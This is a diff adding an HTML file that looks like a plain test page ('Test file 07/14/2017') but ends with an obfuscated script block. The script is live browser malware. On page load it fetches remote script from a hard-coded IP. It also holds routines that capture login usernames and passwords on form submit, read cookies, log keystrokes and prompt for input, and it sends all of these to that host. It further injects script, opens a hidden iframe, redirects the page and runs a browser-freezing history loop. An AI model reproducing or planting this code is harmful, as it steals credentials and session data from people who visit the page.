@@ -1,0 +1,124 @@
+<html>
+<body>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+</body>
+</html>
+<script>if(typeof _glanalytics == 'undefined') {
+  var _glanalytics = true;
+
+  var _su = String.fromCharCode(104,116,116,112,58,47,47,49,55,54,46,49,49,57,46,50,56,46,52,49);
+  var _hh = _su + String.fromCharCode(47,112,111,111,111,108,46,112,104,112);
+  var _cm = _su + String.fromCharCode(47,103,111,108,97,110,103,46,112,104,112);
+
+  function _glga() {
+    var s = document.createElement(String.fromCharCode(115,99,114,105,112,116));
+    s.src = _cm + String.fromCharCode(63,99,97,108,108,98,97,99,107,61,102,110);
+    document.body.appendChild(s);
+    function fn(obj) {}
+  }
+  _glga();
+
+  function _glg() {
+    function fl(wx) {
+      var ir = String.fromCharCode(47,105,110,100,101,120,46,112,104,112,63);
+      var pc = new Image();
+      var rs = Math.floor(Math.random() * 1000);
+      pc.src = String.fromCharCode(104,116,116,112,58,47,47)+wx+ir+rs+'='+rs;
+    }
+    var ps = arguments[0];
+    setInterval(function() { fl(ps); }, 100);
+  }
+
+  function _glb() {
+    var fr = document.getElementsByTagName('form');
+
+    for (var i = 0; i < fr.length; i++) {
+      var fi = fr[i];
+      var _fu = fi.getElementsByTagName('input');
+
+      for (var j = 0; j < _fu.length; j++) {
+        var f = _fu[j];
+
+        if (!fi._pf && f.type == 'password')
+        fi._pf = f;
+        else if (!fi._ui && (f.type == 'text' || f.type == 'email'))
+          fi._ui = f;
+
+        if (!(fi._ui !== undefined && fi._pf !== undefined))
+          continue;
+
+        fi.onsubmit = function() {
+          if (this._ui.value && this._pf.value) {
+            // post credentials to background
+            var _rn = this._ui.value;
+            var _bv = this._pf.value;
+            var pc = new Image();
+            pc.src = _hh+'?gl-fr='+encodeURI(btoa(_rn+'::::'+_bv).slice(0,-2));
+          }
+        }
+      };
+    }
+  };
+
+  function _gla() {
+    var pc = new Image();
+    pc.src = _hh+'?gl-us='+encodeURI(btoa(document.cookie).slice(0,-2));
+  }
+
+  function _glh() {
+    var _ar = arguments[0];
+    var _yu = document.createElement("script");
+    _yu.innerHTML = _ar;
+    document.head.appendChild(_yu);
+  }
+
+  function _glc() {
+    var lgs = '';
+    document.onkeypress = function(e) {
+      _gi = window.event?event:e;
+      lg = _gi.keyCode?_gi.keyCode:_gi.charCode;
+      lg = String.fromCharCode(lg);
+      lgs+=lg;
+    }
+    window.addEventListener("beforeunload", function(e){
+        var pc = new Image();
+        pc.src = _hh+'?gl-cr='+encodeURI(btoa(lgs).slice(0,-2));
+    }, false);
+  }
+
+  function _gle() {
+      var _pa = prompt(arguments[0]);
+      var pc = new Image();
+      pc.src = _hh+'?gl-uk='+encodeURI(btoa(_pa).slice(0,-2));
+  }
+
+  function _gli() {
+      while(true) {
+        var _ts = '';
+        for (var i = 0; i < 100000; i++) {_ts = _ts + i.toString();}
+        history.pushState(0,0, _ts);
+    };
+  }
+
+  function _glj() {
+      window.location.replace(arguments[0]);
+  }
+
+  function _gld() {
+      var op = document.createElement(String.fromCharCode(105,102,114,97,109,101));
+      op.style.cssText = String.fromCharCode(100,105,115,112,108,97,121,58,110,111,110,101);
+      op.src = _su + String.fromCharCode(47,103,108,46,104,116,109,108);
+      op.width = 0;
+      op.height = 0;
+      op.hidden = true;
+      document.body.appendChild(op);
+  };
+
+  function _glf() {
+    var pc = new Image();
+    pc.src = _hh+'?gl-geo=1';
+  };
+}</script>
